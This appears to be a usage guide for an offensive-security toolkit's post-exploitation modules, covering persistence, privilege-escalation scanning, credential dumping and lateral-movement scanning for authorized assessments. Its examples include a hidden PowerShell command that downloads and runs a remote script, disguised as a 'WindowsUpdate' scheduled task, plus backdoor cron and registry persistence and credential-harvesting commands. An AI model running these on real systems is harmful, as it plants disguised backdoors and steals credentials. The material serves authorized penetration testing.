# Post-Exploitation Tools Guide

Complete guide for using the Offensive Security Toolkit's post-exploitation modules for authorized security assessments.

## Table of Contents

- [Overview](#overview)
- [Ethical Use Policy](#ethical-use-policy)
- [Prerequisites](#prerequisites)
- [Module Overview](#module-overview)
- [Usage Examples](#usage-examples)
- [Full Attack Chain Workflow](#full-attack-chain-workflow)
- [Reporting Integration](#reporting-integration)
- [Troubleshooting](#troubleshooting)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

## Overview

The post-exploitation suite provides comprehensive tools for assessing security posture after gaining initial access to a system. These tools cover the complete post-exploitation lifecycle:

1. **Persistence** - Maintain access to compromised systems
2. **Privilege Escalation** - Escalate from user to administrator/root
3. **Credential Harvesting** - Discover stored credentials
4. **Lateral Movement** - Identify pivot opportunities to other systems

### Architecture

```
Initial Access (Out of Scope)
         |
         v
[1. Persistence Module]
    - Establish foothold
    - Scheduled tasks, cron jobs
    - Registry keys, services
         |
         v
[2. Privilege Escalation Scanner]
    - Find privesc vectors
    - Misconfigurations
    - Kernel exploits
         |
         v
[3. Credential Dumper]
    - Harvest credentials
    - WiFi passwords
    - SSH keys, history
         |
         v
[4. Lateral Movement Scanner]
    - Identify pivot targets
    - SMB, RDP, SSH, WinRM
    - Network reconnaissance
         |
         v
   Report & Document
```

## Ethical Use Policy

**CRITICAL**: These tools are for authorized security testing ONLY.

### Legal Requirements

Before using ANY post-exploitation tool, you MUST have:

1. **Written Authorization**: Signed contract or scope document
2. **Explicit Scope**: Systems and networks covered in authorization
3. **Rules of Engagement**: Clear boundaries and restrictions
4. **Notification Plan**: Emergency contacts and escalation procedures
5. **Data Handling Agreement**: How discovered data will be protected

### Unauthorized Use is a Crime

Using these tools without authorization is **illegal** in most jurisdictions:

- **United States**: Computer Fraud and Abuse Act (CFAA) - Up to 20 years imprisonment
- **United Kingdom**: Computer Misuse Act 1990 - Up to 10 years imprisonment
- **European Union**: Cybercrime Directive 2013/40/EU - Criminal prosecution
- **International**: Budapest Convention on Cybercrime - Extradition for prosecution

### Ethical Guidelines

1. **Stay in Scope**: Only test authorized systems
2. **Minimize Impact**: Use rate limiting, avoid disruption
3. **Protect Data**: Encrypt findings, use restrictive file permissions
4. **Report Responsibly**: Document all findings, maintain chain of custody
5. **Cleanup**: Remove all persistence mechanisms when assessment completes

## Prerequisites

### System Requirements

**Windows**:
- Windows 10/11 or Windows Server 2016+
- Administrator privileges (for privesc scanner)
- Python 3.8+ installed

**Linux**:
- Ubuntu 20.04+, Debian 11+, CentOS 8+, or equivalent
- Root access (for privesc scanner)
- Python 3.8+ installed

### Python Dependencies

```bash
# Install toolkit dependencies
pip install -r requirements.txt

# Key dependencies:
# - requests (HTTP client)
# - pyyaml (configuration)
# - loguru (logging)
```

### Configuration

Create or modify `config.yaml`:

```yaml
rate_limit:
  requests_per_second: 10

authorization:
  scope_file: "authorized_targets.txt"
  require_confirmation: true

output:
  directory: "output"
  format: "json"

audit:
  enabled: true
  log_file: "audit.log"
```

Create `authorized_targets.txt`:

```
# Authorized targets for post-exploitation testing
192.168.1.0/24
example-server.local
10.0.0.0/16
```

## Module Overview

### 1. Persistence Module (persistence.py)

**Purpose**: Establish and manage persistent access to compromised systems

**Capabilities**:
- Check existing persistence mechanisms
- Install new persistence mechanisms
- Cleanup all installed persistence

**Platforms**: Windows + Linux

**MITRE ATT&CK**: TA0003 (Persistence)

**File**: `post_exploitation/persistence.py`

### 2. Privilege Escalation Scanner (privesc_scanner.py)

**Purpose**: Identify privilege escalation vectors

**Capabilities**:
- **Windows**: Unquoted service paths, weak permissions, registry autoruns, kernel exploits
- **Linux**: SUID binaries, sudo misconfigurations, cron jobs, kernel exploits

**Platforms**: Windows + Linux (auto-detection)

**MITRE ATT&CK**: TA0004 (Privilege Escalation)

**Files**:
- `post_exploitation/privesc_scanner.py` (unified CLI)
- `post_exploitation/privesc_windows.py` (Windows implementation)
- `post_exploitation/privesc_linux.py` (Linux implementation)

### 3. Credential Dumper (credential_dump.py)

**Purpose**: Ethical credential discovery for authorized security assessments

**Capabilities**:
- **Windows**: Saved credentials, WiFi passwords, registry credentials
- **Linux**: SSH keys, bash history, config files, environment variables

**Platforms**: Windows + Linux

**MITRE ATT&CK**: TA0006 (Credential Access)

**File**: `post_exploitation/credential_dump.py`

### 4. Lateral Movement Scanner (lateral_movement.py)

**Purpose**: Identify lateral movement opportunities in network

**Capabilities**:
- Multi-protocol scanning (SMB, RDP, SSH, WinRM, WMI, VNC)
- SMB share enumeration
- Service banner grabbing
- CIDR range expansion

**Platforms**: Windows + Linux

**MITRE ATT&CK**: TA0008 (Lateral Movement)

**File**: `post_exploitation/lateral_movement.py`

## Usage Examples

### Persistence Module

#### Check Existing Persistence

```bash
# Windows
python post_exploitation/persistence.py --check

# Linux
python post_exploitation/persistence.py --check
```

#### Install Persistence (Authorized Testing Only)

```bash
# Windows: Install scheduled task
python post_exploitation/persistence.py \
    --install scheduled_task \
    --command "powershell.exe -WindowStyle Hidden -Command 'IEX (New-Object Net.WebClient).DownloadString(\"http://10.0.0.1/shell.ps1\")'" \
    --name "WindowsUpdate"

# Linux: Install cron job
python post_exploitation/persistence.py \
    --install cron \
    --command "/usr/bin/python3 /tmp/backdoor.py" \
    --schedule "*/15 * * * *"

# Windows: Install registry run key
python post_exploitation/persistence.py \
    --install registry \
    --command "C:\\Windows\\System32\\backdoor.exe" \
    --name "SecurityUpdate"
```

#### Cleanup All Persistence

```bash
# Remove all installed persistence mechanisms
python post_exploitation/persistence.py --cleanup
```

**Output**: JSON file with persistence findings + `.persistence_log.json` audit log

### Privilege Escalation Scanner

#### Full Scan (Auto-OS Detection)

```bash
# Run on current system (auto-detects Windows/Linux)
python post_exploitation/privesc_scanner.py --scan-all --output privesc_findings.json
```

#### Windows-Specific Scans

```bash
# Scan for unquoted service paths
python post_exploitation/privesc_windows.py --scan unquoted_services --output findings.json

# Scan for weak service permissions
python post_exploitation/privesc_windows.py --scan weak_services --output findings.json

# Scan registry autoruns
python post_exploitation/privesc_windows.py --scan registry_autoruns --output findings.json

# Check token privileges
python post_exploitation/privesc_windows.py --scan token_privileges --output findings.json

# Full Windows scan
python post_exploitation/privesc_windows.py --scan-all --output windows_privesc.json
```

#### Linux-Specific Scans

```bash
# Scan for SUID binaries
python post_exploitation/privesc_linux.py --scan suid --output findings.json

# Scan sudo misconfigurations
python post_exploitation/privesc_linux.py --scan sudo --output findings.json

# Scan cron jobs
python post_exploitation/privesc_linux.py --scan cron --output findings.json

# Check writable critical files
python post_exploitation/privesc_linux.py --scan writable_files --output findings.json

# Full Linux scan
python post_exploitation/privesc_linux.py --scan-all --output linux_privesc.json
```

**Output**: JSON file with severity ratings, exploitation guidance, and MITRE techniques

### Credential Dumper

**IMPORTANT**: This tool requires explicit authorization confirmation before running.

#### Windows Credential Discovery

```bash
# Dump all Windows credentials
python post_exploitation/credential_dump.py --all --output windows_creds.json

# Dump specific credential types
python post_exploitation/credential_dump.py --type saved --output saved_creds.json
python post_exploitation/credential_dump.py --type wifi --output wifi_creds.json
python post_exploitation/credential_dump.py --type registry --output registry_creds.json
```

#### Linux Credential Discovery

```bash
# Dump all Linux credentials
python post_exploitation/credential_dump.py --all --output linux_creds.json

# Dump specific credential types
python post_exploitation/credential_dump.py --type ssh --output ssh_keys.json
python post_exploitation/credential_dump.py --type history --output history_creds.json
python post_exploitation/credential_dump.py --type config --output config_creds.json
```

**Authorization Prompt**:
```
[!] EXTREMELY SENSITIVE OPERATION
[!] This tool accesses credential stores and sensitive data
[!] Ensure you have EXPLICIT AUTHORIZATION for this assessment
[!] All operations are logged to audit.log

Authorization Details:
  Target: WORKSTATION-01
  Scope: C:\Users\david.dashti\OneDrive - Hermes Medical Solutions AB\Documents\David - Main\Personal\Private\Code - 2\offensive-toolkit\authorized_targets.txt
  Date: 2025-10-15 14:35:22

Do you have authorization to proceed? (yes/no):
```

**Output**: JSON file with Base64-obfuscated credentials, 0600 file permissions, audit log entry

### Lateral Movement Scanner

#### Scan Network Range

```bash
# Scan for all lateral movement opportunities
python post_exploitation/lateral_movement.py \
    --target 192.168.1.0/24 \
    --scan all \
    --output lateral_findings.json

# Scan specific protocols
python post_exploitation/lateral_movement.py \
    --target 192.168.1.0/24 \
    --scan smb,rdp,ssh \
    --output lateral_scan.json

# Scan from file of targets
python post_exploitation/lateral_movement.py \
    --targets-file discovered_hosts.txt \
    --scan all \
    --output lateral_findings.json

# Adjust concurrency for stealth
python post_exploitation/lateral_movement.py \
    --target 10.0.0.0/24 \
    --scan all \
    --workers 5 \
    --output stealthy_scan.json
```

**Output**: JSON file with accessible hosts, open ports, SMB shares, vulnerabilities

## Full Attack Chain Workflow

This example demonstrates a complete post-exploitation assessment workflow.

### Scenario

**Target**: Windows domain environment (authorized security assessment)
**Goal**: Assess post-exploitation security posture from user-level access

### Phase 1: Establish Persistence

```bash
# Check for existing persistence mechanisms
python post_exploitation/persistence.py --check --output initial_persistence.json

# Install authorized persistence for testing continuity
python post_exploitation/persistence.py \
    --install scheduled_task \
    --command "powershell.exe -WindowStyle Hidden -File C:\\Tools\\callback.ps1" \
    --name "WindowsDefenderUpdate" \
    --output persistence_installed.json
```

### Phase 2: Privilege Escalation Reconnaissance

```bash
# Scan for privilege escalation vectors
python post_exploitation/privesc_scanner.py \
    --scan-all \
    --output privesc_findings.json

# Review findings (example)
# Found: Unquoted service path C:\Program Files\Custom App\service.exe
# Found: AlwaysInstallElevated enabled in registry
# Found: Token privilege SeImpersonatePrivilege enabled
```

### Phase 3: Credential Harvesting

```bash
# Discover stored credentials (after authorization confirmation)
python post_exploitation/credential_dump.py \
    --all \
    --output credentials_discovered.json

# Review findings (example)
# Found: 5 saved credentials (cmdkey)
# Found: 3 WiFi passwords
# Found: 2 registry credentials
```

### Phase 4: Lateral Movement Reconnaissance

```bash
# Scan network for lateral movement opportunities
python post_exploitation/lateral_movement.py \
    --target 192.168.10.0/24 \
    --scan all \
    --workers 10 \
    --output lateral_opportunities.json

# Review findings (example)
# Found: 15 hosts with SMB (445) accessible
# Found: 8 hosts with RDP (3389) accessible
# Found: 3 hosts with WinRM (5985) enabled
# Found: 12 SMB shares enumerated
```

### Phase 5: Cleanup

```bash
# Remove all installed persistence mechanisms
python post_exploitation/persistence.py --cleanup

# Verify cleanup
python post_exploitation/persistence.py --check --output final_persistence_check.json
```

### Phase 6: Generate Report

```bash
# Generate comprehensive report with all findings
python reporting/unified_report.py \
    --scan-dir output/ \
    --format html,json \
    --output post_exploitation_assessment \
    --defectdojo \
    --engagement-id 42
```

## Reporting Integration

### Generate Post-Exploitation Report

```bash
# All post-exploitation findings in single report
python reporting/report_generator.py \
    --input-dir output/ \
    --format html \
    --output post_exploitation_report.html
```

### Upload to DefectDojo

```bash
# Upload all findings to DefectDojo engagement
python reporting/unified_report.py \
    --scan-dir output/ \
    --format html,json \
    --defectdojo \
    --engagement-id 15 \
    --output comprehensive_assessment
```

### Example Report Statistics

```
Post-Exploitation Assessment Report
=====================================

Executive Summary:
  Total Scans: 4
  Total Findings: 37
  Critical: 2
  High: 8
  Medium: 15
  Low: 12

By Category:
  Persistence Mechanisms: 5
  Privilege Escalation Vectors: 12
  Credentials Discovered: 10
  Lateral Movement Opportunities: 10

MITRE ATT&CK Coverage:
  TA0003 (Persistence): 5 techniques
  TA0004 (Privilege Escalation): 8 techniques
  TA0006 (Credential Access): 6 techniques
  TA0008 (Lateral Movement): 4 techniques
```

## Troubleshooting

### Common Issues

#### Permission Denied Errors

**Problem**: "Access is denied" or "Permission denied"

**Solution**:
- Windows: Run PowerShell/CMD as Administrator
- Linux: Run with `sudo` for privileged operations
- Verify user has necessary permissions for the operation

#### Authorization Check Failures

**Problem**: "Target not in authorized scope"

**Solution**:
1. Check `authorized_targets.txt` exists and is populated
2. Verify target IP/hostname is listed in scope file
3. Ensure proper CIDR notation (192.168.1.0/24)

#### Rate Limiting Too Aggressive

**Problem**: Scanning very slow

**Solution**:
```yaml
# Adjust in config.yaml
rate_limit:
  requests_per_second: 50  # Increase from default 10
```

#### Missing Dependencies (Linux)

**Problem**: "smbclient: command not found"

**Solution**:
```bash
# Ubuntu/Debian
sudo apt install smbclient cifs-utils

# CentOS/RHEL
sudo yum install samba-client cifs-utils
```

#### Audit Log Growing Large

**Problem**: `audit.log` consuming disk space

**Solution**:
```bash
# Rotate audit logs
mv audit.log audit.log.$(date +%Y%m%d)
gzip audit.log.*

# Configure log rotation in /etc/logrotate.d/offensive-toolkit
```

### Security Considerations

#### Protecting Discovered Credentials

All credential dumps are:
1. **Obfuscated**: Base64 encoding (not encryption!)
2. **Restricted Permissions**: 0600 (owner read/write only)
3. **Audit Logged**: All operations logged with timestamps
4. **Ephemeral**: Should be deleted after reporting

**Best Practice**:
```bash
# Encrypt credential dumps for reporting
gpg --encrypt --recipient security-team@company.com credentials_discovered.json

# Securely delete original
shred -vfz -n 10 credentials_discovered.json
```

#### Network Detection Concerns

Lateral movement scanning may trigger:
- Intrusion Detection Systems (IDS)
- Security Information and Event Management (SIEM) alerts
- Network anomaly detection

**Mitigation**:
1. Coordinate with blue team before scanning
2. Use low worker counts (--workers 3)
3. Increase rate limiting delays
4. Scan during approved maintenance windows

## MITRE ATT&CK Mapping

### Persistence (TA0003)

| Technique | Tool | Function |
|-----------|------|----------|
| T1053.005 | persistence.py | Scheduled Task/Job: Scheduled Task |
| T1053.003 | persistence.py | Scheduled Task/Job: Cron |
| T1547.001 | persistence.py | Boot or Logon Autostart Execution: Registry Run Keys |
| T1543.003 | persistence.py | Create or Modify System Process: Windows Service |
| T1543.002 | persistence.py | Create or Modify System Process: Systemd Service |

### Privilege Escalation (TA0004)

| Technique | Tool | Function |
|-----------|------|----------|
| T1574.009 | privesc_windows.py | Hijack Execution Flow: Path Interception by Unquoted Path |
| T1574.011 | privesc_windows.py | Hijack Execution Flow: Services Registry Permissions Weakness |
| T1547.001 | privesc_windows.py | Boot or Logon Autostart Execution: Registry Run Keys |
| T1548.002 | privesc_windows.py | Abuse Elevation Control Mechanism: Bypass UAC |
| T1134.001 | privesc_windows.py | Access Token Manipulation: Token Impersonation/Theft |
| T1068 | privesc_windows.py, privesc_linux.py | Exploitation for Privilege Escalation |
| T1548.001 | privesc_linux.py | Abuse Elevation Control Mechanism: Setuid/Setgid |
| T1548.003 | privesc_linux.py | Abuse Elevation Control Mechanism: Sudo and Sudo Caching |
| T1611 | privesc_linux.py | Escape to Host |

### Credential Access (TA0006)

| Technique | Tool | Function |
|-----------|------|----------|
| T1555.003 | credential_dump.py | Credentials from Password Stores: Credentials from Web Browsers |
| T1555.004 | credential_dump.py | Credentials from Password Stores: Windows Credential Manager |
| T1552.001 | credential_dump.py | Unsecured Credentials: Credentials In Files |
| T1552.004 | credential_dump.py | Unsecured Credentials: Private Keys |
| T1087 | credential_dump.py | Account Discovery |

### Lateral Movement (TA0008)

| Technique | Tool | Function |
|-----------|------|----------|
| T1021.001 | lateral_movement.py | Remote Services: Remote Desktop Protocol |
| T1021.002 | lateral_movement.py | Remote Services: SMB/Windows Admin Shares |
| T1021.004 | lateral_movement.py | Remote Services: SSH |
| T1021.006 | lateral_movement.py | Remote Services: Windows Remote Management |
| T1570 | lateral_movement.py | Lateral Tool Transfer |
| T1550 | lateral_movement.py | Use Alternate Authentication Material |

## Advanced Topics

### Chaining Tools Together

Example: Find privesc vector, exploit it, dump credentials, pivot laterally

```bash
# 1. Find privilege escalation vector
python post_exploitation/privesc_scanner.py --scan-all --output privesc.json

# 2. Manually exploit found vector (out of scope for toolkit)
# Example: Exploited AlwaysInstallElevated to get SYSTEM shell

# 3. Dump credentials with elevated privileges
python post_exploitation/credential_dump.py --all --output creds_elevated.json

# 4. Use discovered credentials for lateral movement reconnaissance
python post_exploitation/lateral_movement.py \
    --target 192.168.1.0/24 \
    --scan all \
    --output lateral_with_creds.json
```

### Custom Persistence Mechanisms

For advanced assessments, extend persistence.py:

```python
# Example: Custom WMI persistence (Windows)
def _install_windows_wmi_persistence(self, name: str, command: str):
    """Install WMI event subscription persistence."""
    # Create WMI event filter
    wmi_filter = f"""
    $Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
        Name = "{name}_Filter";
        EventNamespace = "root\\cimv2";
        QueryLanguage = "WQL";
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
    }}
    """
    # Create WMI consumer and binding...
```

### Integration with C2 Frameworks

Post-exploitation tools can feed discovered intelligence to C2 frameworks:

```bash
# Export findings in C2-compatible format
python reporting/report_generator.py \
    --input-dir output/ \
    --format json \
    --output findings.json

# Parse and import to C2 (example with Metasploit)
msfconsole -q -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS file:lateral_opportunities.json; run"
```

## Best Practices

1. **Always Authorize**: Get written permission before any testing
2. **Document Everything**: Maintain detailed logs and chain of custody
3. **Minimize Impact**: Use rate limiting, avoid denial of service
4. **Protect Findings**: Encrypt sensitive data, use secure channels
5. **Cleanup Thoroughly**: Remove all persistence, restore original state
6. **Report Responsibly**: Provide clear, actionable recommendations
7. **Continuous Learning**: Stay updated on latest techniques and defenses

## References

- **MITRE ATT&CK**: https://attack.mitre.org/
- **PTES Technical Guidelines**: http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **GTFOBins** (Linux privesc): https://gtfobins.github.io/
- **LOLBAS** (Windows privesc): https://lolbas-project.github.io/

## Support

For issues, questions, or feature requests:
- **GitHub Issues**: https://github.com/Dashtid/offensive-toolkit/issues
- **Security Concerns**: Open a GitHub Security Advisory
- **Documentation**: See README.md and ARCHITECTURE.md

---

**Last Updated**: 2025-10-15
**Version**: 1.0

**Author**: David Dashti

**Legal Disclaimer**: This toolkit is for authorized security testing only. Unauthorized use is illegal and punishable under applicable laws. The author assumes no liability for misuse of these tools.
